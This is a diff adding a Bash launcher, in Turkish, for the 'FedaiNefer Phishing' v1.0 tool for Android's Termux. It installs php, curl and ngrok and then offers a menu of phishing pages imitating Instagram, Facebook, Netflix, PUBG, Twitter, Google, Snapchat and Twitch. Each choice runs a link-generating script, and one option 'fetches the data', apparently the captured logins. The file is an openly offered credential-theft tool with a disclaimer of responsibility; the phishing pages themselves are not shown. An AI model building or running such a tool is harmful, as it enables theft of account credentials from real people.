@@ -1,0 +1,228 @@
+#!/bin/bash
+#FedaiNefer
+#########################################################################################################
+# Bu toolun kullanımı kişinin sorumluluğundadır. FedaiNefer hiçbir sorumluluk kabul etmez..             #
+#########################################################################################################
+# (The use of this tool is the responsibility of the person. FedaiNefer does not take responsibility..) #
+#########################################################################################################
+clear
+echo " "
+echo -e "\e[1;49;32m ___       _      _ _  _      __            __  _    _    _    _ "
+echo -e "| __|__ __| |__ _(_) \| |___ / _|___ _ _   | _ \ |_ (_)__| |_ (_)_ _  __ _ "
+echo -e "| _/ -_) _  / _  | |    / -_)  _/ -_)  _|  |  _/ ' \| ( -|   \| |   \/ _  | "
+echo -e "|_|\___\__,_\__,_|_|_|\_\___|_| \___|_|    |_| |_||_|_/__/_||_|_|_||_\__  | "
+echo -e "                                                                     |___/ "
+echo -e "\e[1;49;31m                                                                            v1.0"
+echo " "
+echo -e "                                 \e[4;49;35m Code: FedaiNefer \e[0m"
+echo -e "		          \e[4;49;35mTelegram:https://t.me/FedaiNefer \e[0m"
+echo " "
+echo " "
+                                #TERMUX-API
+	echo -e "\e[1;49;32m termux-api Paketi Yükleniyor... \e[0m"
+	echo " "
+	sleep 2
+        pkg install termux-api -y
+        sleep 3
+        clear
+
+
+echo " "
+echo " "
+echo -e "\e[1;49;31m🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹"
+echo -e "\e[1;49;31m🌹  Kabadayılık bitti, sonuncusu yarın Öğle Namazı’nda gidiyor... 🌹											"
+echo -e "\e[1;49;31m🌹								  🌹											"
+echo -e "\e[1;49;31m🌹                Mekanın cennet olsun Güllü Dayı 	          🌹											"
+echo -e "\e[1;49;31m🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹🌹"
+						  	 
+
+
+        termux-toast -b black -c cyan "Selamun Aleykum"
+        sleep 2
+        termux-toast -b black -c cyan  "Google Play' dan Termux-API Uygulamasını indirmeyi ve tüm izinlerini vermeyi unutma "
+        sleep 6
+        termux-toast -b black -c cyan  "Biraz sonra tool için gerekli kurulumları yapılacak."
+        sleep 4
+        termux-toast -b black -c cyan  "Kurulum bittiğinde sana bir bildirim gelecek."
+        sleep 3
+        termux-toast -b black -c cyan  "Kurulum başlasın."
+        sleep 2
+        termux-toast -b black -c cyan  "FedaiNefer"
+        sleep 4
+
+chmod 777 FedaiNefer.sh
+termux-setup-storage > /dev/null 2>&1 &
+sleep 3
+                                #GEREKLİ KURULUMLAR
+	apt update && apt upgrade -y
+	pkg install git -y
+	pkg install nano -y
+	apt install curl -y
+	apt install wget -y
+	apt install php -y
+	apt install cat
+                                #NGROK KURULUM
+        cd $HOME/FedaiNefer_Phishing/Siteler/ngrok_yükleme/ngrok
+        chmod 777 *
+        rm -rf /data/data/com.termux/files/usr/bin/ngrok
+        cp -r  ngrok /data/data/com.termux/files/usr/bin
+        termux-notification -t "Ngrok Kullanıma Hazır."
+        termux-notification -t "Tool kullanıma hazır."
+        termux-toast -b black -c cyan "Kurulum Bitti"
+        sleep 3
+echo ""
+clear
+echo
+echo -e "\e[1;49;32m ___       _      _ _  _      __            __  _    _    _    _ "
+echo -e "| __|__ __| |__ _(_) \| |___ / _|___ _ _   | _ \ |_ (_)__| |_ (_)_ _  __ _ "
+echo -e "| _/ -_) _  / _  | |    / -_)  _/ -_)  _|  |  _/ ' \| ( -|   \| |   \/ _  | "
+echo -e "|_|\___\__,_\__,_|_|_|\_\___|_| \___|_|    |_| |_||_|_/__/_||_|_|_||_\__  | "
+echo -e "                                                                     |___/ "
+echo -e "\e[1;49;31m                                                                            v1.0"
+echo ""
+echo -e "\e[0;49;91m
+             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+             ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                "
+echo -e " \e[36m                                      FedaiNefer "
+echo -e " \e[32m                           ******************************* "
+echo -e "\e[1;49;32m Lütfen entera bas"
+read
+echo -e  " \e[7;49;93m ⬇️⬇️⬇️Sorunlar için telegram hesabım⬇️⬇️⬇️\e[0m"
+sleep 1
+termux-open-url https://t.me/FedaiNefer
+sleep 3
+clear
+echo " "
+echo -e "\e[0;49;91m
+                ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▒ ▒ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▒ ▓ ▓ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▒ ▒ ▒ ▒ ▒ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+                ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓ ▓
+		"
+echo -e " \e[36m                                      FedaiNefer "
+echo -e " \e[32m                           ******************************* "
+
+
+echo -e "                    \e[31m[\e[32m01\e[31m]\e[37minstagram phishing     \e[31m[\e[32m02\e[31m]\e[37mfacebook phishing"
+echo -e " "
+echo -e "                    \e[31m[\e[32m03\e[31m]\e[37mnetflix phishing       \e[31m[\e[32m04\e[31m]\e[37mpubg phising "
+echo -e " "
+echo -e "                    \e[31m[\e[32m05\e[31m]\e[37mtwitter phishing       \e[31m[\e[32m06\e[31m]\e[37mgoogle phishing "
+echo -e " "
+echo -e "                    \e[31m[\e[32m07\e[31m]\e[37minstagram panel        \e[31m[\e[32m08\e[31m]\e[37mfacebook panel "
+echo -e " "
+echo -e "                    \e[31m[\e[32m09\e[31m]\e[37msnapchat phishing      \e[31m[\e[32m10\e[31m]\e[37mtwitch phishing "
+echo -e " "
+echo -e "                           \e[34m******************************* "
+echo -e " "
+echo -e "                    \e[31m[\e[32m99\e[31m]\e[37mÇıkış\e[31                    \e[31m[\e[32m00\e[31m]\e[37mVerileri Getir"
+echo -e " "
+echo -e "                    \e[31m[\e[32m100\e[31m]\e[37mNgrok Sürümü Değiştir\e[31 "
+echo -e "\e[31m"
+
+read -p " $ İşlem Numarası : " islem
+
+if [[ $islem == 1 || $islem == 01 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 2 || $islem == 02 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 3 || $islem == 03 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 4 || $islem == 04 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 5 || $islem == 05 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 6 || $islem == 06 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 7 || $islem == 07 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 8 || $islem == 08 ]]; then
+        sleep 1
+        clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        bash link_ver.sh
+
+elif [[ $islem == 9 || $islem == 09 ]]; then
+	sleep 1
+	clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+	bash link_ver.sh
+
+elif [[ $islem == 10 ]]; then
+	sleep 1
+	clear
+	cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+	bash link_ver.sh
+
+elif [[ $islem == 100 || $islem == 100 ]]; then
+        sleep 1
+        clear
+        cd /data/data/com.termux/files/home/FedaiNefer_Phishing/Siteler/ngrok_yükleme
+        bash ngrok.sh
+
+elif [[ $islem == 00 ]]; then
+        cd /data/data/com.termux/files/home/FedaiNefer_Phishing
+        chmod 777 verileri_getir.sh
+        bash verileri_getir.sh
+
+elif [[ $islem == 99 ]]; then
+        exit 1
+else
+        sleep 1
+        clear
+fi
+
+
